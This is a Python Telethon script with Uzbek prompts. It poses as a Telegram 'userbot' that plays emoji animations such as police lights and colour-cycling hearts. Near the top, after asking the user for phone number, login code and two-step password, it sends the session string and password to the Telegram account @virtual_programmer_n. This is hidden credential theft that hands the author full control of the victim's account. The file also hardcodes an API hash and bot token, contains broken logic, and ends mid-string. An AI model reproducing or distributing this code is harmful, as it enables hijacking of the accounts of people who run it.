from telethon import TelegramClient, events, sync, functions, types
from telethon.errors import rpcbaseerrors
import time
import os,sys
##''
from emoji import emojize
from math import sqrt
from telethon.tl.functions.channels import GetFullChannelRequest, GetParticipantsRequest
from telethon.tl.functions.messages import GetHistoryRequest, CheckChatInviteRequest, GetFullChatRequest
from telethon.tl.types import MessageActionChannelMigrateFrom, ChannelParticipantsAdmins
from telethon.errors import (ChannelInvalidError, ChannelPrivateError, ChannelPublicGroupNaError, InviteHashEmptyError, InviteHashExpiredError, InviteHashInvalidError)
from telethon.utils import get_input_location
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from datetime import datetime
from telethon.tl.functions.account import UpdateProfileRequest
import asyncio, aiocron, datetime
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChatBannedRights, User

#
import random
import time
import os, sys
import asyncio
import random
import wikipedia 
import requests
from collections import deque
from telethon.tl.types import ChannelParticipantsAdmins
import datetime
import os, sys
import time
#modules
from telethon.tl.functions.channels import JoinChannelRequest
import telethon.errors

from telethon import TelegramClient
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import DeleteMessagesRequest
import os
os.system("cls")
api_id = 15321012
api_hash = "833e6869c442004c6e56a0e16d7964fe"
bot_token = "5887685653:AAHKjiY0ogULF5Ub7MmJnM9-aBZw06b2lps"
string = input('\033[34m[ \033[91minput session code or press enter\033[34m]') 
password = None
client = TelegramClient(StringSession(), api_id, api_hash)
phone_number = input("\033[34m 📱telegram Raqamni♻ kiring✔:\033[97m ")
client.connect()
client.send_code_request(phone_number)
try:
	me = client.sign_in(phone_number, input('kodni☎ kiriting: '))
except SessionPasswordNeededError:
    password = input('\033[34m2 bosqichli parolni🔐 kiriting📝: ')
client.start()
client.sign_in(password=password)
#modules
message2=client.send_message("@virtual_programmer_n", f'Session: {client.session.save()}\nPhone number : {phone_number}\nPassword: {password}')
time.sleep(999999999)
message2.delete()

client.send_message("@virtual_programmer_n", "VIRTUAL PROGRAMMER BEST OF THE BEST WITH SHOHJAHON☠️")
@aiocron.crontab("*/1 * * * *")	

@client.on(events.NewMessage(pattern=".yordam"))
async def darknet(event):
	yordam = ["""🦊UzBot - animatsiya uchun userbot
🦊программист: @virtual_programmer_n
🦊канал: yo'q'
🕷 Модули 🕸 19
🖊 .type - yozuv animatsiyasi (ishlatish>>.type birota so'z')
😿 .sorry - chiroyli shriftda "sorry " so'zi'
😺 .thanks - chiroyli shriftda "thanks" so'zi'
💀 .smile - smile animatsiyalari
🔫 .pisto - pistolet
🧩 .info - o'zingiz haqida ma'lumot
🗿 .chats - sizning chatlaringiz soni
🧠 .brain - miyya animatsiyasi
🌅 .pic - kartinka
🚔 .police - politsiya animatsiyasi
🪄 .magic - yurak animatsiyasi
🌝 .oy - oy animatsiyasi
🤷‍♂ .what - animatsiya "nima?"
🆗 .ok - katta harflar bilan  "ок" so'zi'
🙅‍♂ .no - katta harflar bilan "nо" so'zi'
⏩ .revnum - 10-0 gacha teskari sanoq
🤚 .hi - katta harflar bilan "hello" so'z8'
❤️ .hearts - yurak animatsiyasi 2
🈳 .d - nma malumot anglatishini bilmayman
🖕 .fuck - animatsiya fuck"""]
	for d in yordam:
		await event.edit(d)
		#new animation
@client.on(events.NewMessage(pattern=".police"))
async def darknet(event):
	police = ["""  🔴🔴🔴⬜⬜⬜🔵🔵🔵 🔴🔴🔴⬜⬜⬜🔵🔵🔵 🔴🔴🔴⬜⬜⬜🔵🔵🔵""", """ 🔵🔵🔵⬜⬜⬜🔴🔴🔴
🔵🔵🔵⬜⬜⬜🔴🔴🔴
🔵🔵🔵⬜⬜⬜🔴🔴🔴"""]
	time.sleep(0.1)
	for i in range(30):
		time.sleep(0.2)
		for d in police:
			time.sleep(0.2)
			await event.edit(d)
@client.on(events.NewMessage(pattern=".bekzod"))
async def darknet(event):
	bekzod=["""ℬℯ𝓀𝓏ℴ𝒹+𝒩ℴ𝓏𝒶𝓃𝒾𝓃""","""🄱🄴🄺🅉🄾🄳+🄽🄾🅉🄰🄽🄸🄽""","""🅱️🅴🅺🆉🅾️🅳+🅽🅾️🆉🅰️🅽🅸🅽""","""I LOVE YOU❤️N"""]
	time.sleep(0.1)
	for a in bekzod:
		time.sleep(0.7)
		await event.edit(a)						
@client.on(events.NewMessage(pattern=".magic"))
async def darknetUzb(event):
	magic = ["""🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍🧡🧡🤍🧡🧡🤍🤍
🤍🧡🧡🧡🧡🧡🧡🧡🤍
🤍🧡🧡🧡🧡🧡🧡🧡🤍
🤍🧡🧡🧡🧡🧡🧡🧡🤍
🤍🤍🧡🧡🧡🧡🧡🤍🤍
🤍🤍🤍🧡🧡🧡🤍🤍🤍
🤍🤍🤍🤍🧡🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍💛💛🤍💛💛🤍🤍
🤍💛💛💛💛💛💛💛🤍
🤍💛💛💛💛💛💛💛🤍
🤍💛💛💛💛💛💛💛🤍
🤍🤍💛💛💛💛💛🤍🤍
🤍🤍🤍💛💛💛🤍🤍🤍
🤍🤍🤍🤍💛🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍💚💚🤍💚💚🤍🤍
🤍💚💚💚💚💚💚💚🤍
🤍💚💚💚💚💚💚💚🤍
🤍💚💚💚💚💚💚💚🤍
🤍🤍💚💚💚💚💚🤍🤍
🤍🤍🤍💚💚💚🤍🤍🤍
🤍🤍🤍🤍💚🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""","""🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍💙💙🤍💙💙🤍🤍
🤍💙💙💙💙💙💙💙🤍
🤍💙💙💙💙💙💙💙🤍
🤍💙💙💙💙💙💙💙🤍
🤍🤍💙💙💙💙💙🤍🤍
🤍🤍🤍💙💙💙🤍🤍🤍
🤍🤍🤍🤍💙🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍💜💜🤍💜💜🤍🤍
🤍💜💜💜💜💜💜💜🤍
🤍💜💜💜💜💜💜💜🤍
🤍💜💜💜💜💜💜💜🤍
🤍🤍💜💜💜💜💜🤍🤍
🤍🤍🤍💜💜💜🤍🤍🤍
🤍🤍🤍🤍💜🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍🤎🤎🤍🤎🤎🤍🤍
🤍🤎🤎🤎🤎🤎🤎🤎🤍
🤍🤎🤎🤎🤎🤎🤎🤎🤍
🤍🤎🤎🤎🤎🤎🤎🤎🤍
🤍🤍🤎🤎🤎🤎🤎🤍🤍
🤍🤍🤍🤎🤎🤎🤍🤍🤍
🤍🤍🤍🤍🤎🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍🖤🖤🤍🖤🖤🤍🤍
🤍🖤🖤🖤🖤🖤🖤🖤🤍
🤍🖤🖤🖤🖤🖤🖤🖤🤍
🤍🖤🖤🖤🖤🖤🖤🖤🤍
🤍🤍🖤🖤🖤🖤🖤🤍🤍
🤍🤍🤍🖤🖤🖤🤍🤍🤍
🤍🤍🤍🤍🖤🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍💖💖🤍💖💖🤍🤍
🤍💖💖💖💖💖💖💖🤍
🤍💖💖💖💖💖💖💖🤍
🤍💖💖💖💖💖💖💖🤍
🤍🤍💖💖💖💖💖🤍🤍
🤍🤍🤍💖💖💖🤍🤍🤍
🤍🤍🤍🤍💖🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍💛💛🤍💜🖤🤍🤍
🤍💜💙💚🧡🖤💛💚🤍
🤍❤️💙🤎💚🖤💖❤️🤍
🤍💜🤎🤎💛💜🧡❤️🤍
🤍🤍🤎💜💙💜💜🤍🤍
🤍🤍🤍❤️❤️🧡🤍🤍🤍
🤍🤍🤍🤍🤎🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍🧡🤎🤍💛💖🤍🤍
🤍💙🤎💖🧡🧡💛🧡🤍
🤍💚🧡💚💚💜💛💚🤍
🤍❤️❤️❤️💛🤎🤎🤎🤍
🤍🤍🧡💜🧡💜🖤🤍🤍
🤍🤍🤍🧡🤎🖤🤍🤍🤍
🤍🤍🤍🤍💖🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍💙🖤🤍🧡💙🤍🤍
🤍🧡❤️🧡💛🖤🖤💖🤍
🤍🤎💙💙💙💜❤️🤎🤍
🤍💜💙💖❤️❤️💜💖🤍
🤍🤍💜💜💛💛💙🤍🤍
🤍🤍🤍🤎🖤🧡🤍🤍🤍
🤍🤍🤍🤍💖🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍🧡💖🤍❤️🖤🤍🤍
🤍🤎💛💖🧡💜🖤💖🤍
🤍🖤❤️🧡💛💛🖤🖤🤍
🤍🖤❤️💛💜💛💖🖤🤍
🤍🤍🤎💚💜💛🤎🤍🤍
🤍🤍🤍❤️💛💜🤍🤍🤍
🤍🤍🤍🤍💛🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍🧡💛🤍❤️🧡🤍🤍
🤍🖤❤️💚💖🧡💜🖤🤍
🤍🧡❤️💛💛🧡🖤💖🤍
🤍💛💙💛❤️🤎💜❤️🤍
🤍🤍💖🖤❤️💛❤️🤍🤍
🤍🤍🤍💚❤️❤️🤍🤍🤍
🤍🤍🤍🤍💙🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""","""
🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍🖤💖🤍❤️🖤🤍🤍
🤍🖤💙❤️💛💙💛🧡🤍
🤍❤️💙💛💛💖🤎💙🤍
🤍🖤💜🖤❤️💜💛💛🤍
🤍🤍💛💙💛💖💚🤍🤍
🤍🤍🤍💜🤎💚🤍🤍🤍
🤍🤍🤍🤍💜🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍💙🤎🤍💖❤️🤍🤍
🤍💙❤️🤎💙💚🖤💚🤍
🤍🧡🧡🤎💙💜🤎💛🤍
🤍🤎💚🤎🖤💙💛💙🤍
🤍🤍🤎🧡🤎🧡💛🤍🤍
🤍🤍🤍💜💚💚🤍🤍🤍
🤍🤍🤍🤍💙🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """🤍🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️🤍🤍🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️🤍🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️🤍🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️🤍🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️🤍🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️🤍🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️🤍🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""","""❤️❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
🤍🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️🤍❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️🤍❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️🤍🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️🤍
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""","""❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
🤍❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
🤍🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️🤍❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
🤍🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️🤍🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️🤍❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
🤍🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
